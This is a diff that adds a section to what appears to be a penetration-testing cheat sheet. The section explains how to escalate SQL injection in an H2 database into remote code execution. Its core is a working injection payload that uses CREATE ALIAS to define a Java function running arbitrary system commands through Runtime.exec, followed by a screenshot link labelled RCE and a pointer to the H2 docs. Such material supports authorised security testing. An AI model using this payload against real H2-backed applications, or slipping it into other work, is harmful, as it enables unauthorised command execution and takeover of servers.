@@ -4393,5 +4393,33 @@ hashcat -a 0 -m 3200 (hash) (wordlist)
 
 -----------------------
 
+### H2 db sqlinjection to rce 
+
+-----------------------
+
+- Payload to create a function without `$$` or `concat`-:
+
+```java
+SQL Injection';CREATE ALIAS exec_cmd1 AS 'String shellme(String cmd) throws java.io.IOException {
+     java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
+     return s.hasNext() ? s.next() : "";}'--
+```
+
+- RCE-:
+
+![image](https://github.com/user-attachments/assets/766dbd42-c6d7-4423-91aa-4415ff077819)
+
+----------------------
+
+### Reference
+
+-----------------------
+
+- [H2 Alias docs](https://www.h2database.com/html/commands.html#create_alias)
+
+------------------------
+
+
+
 
 
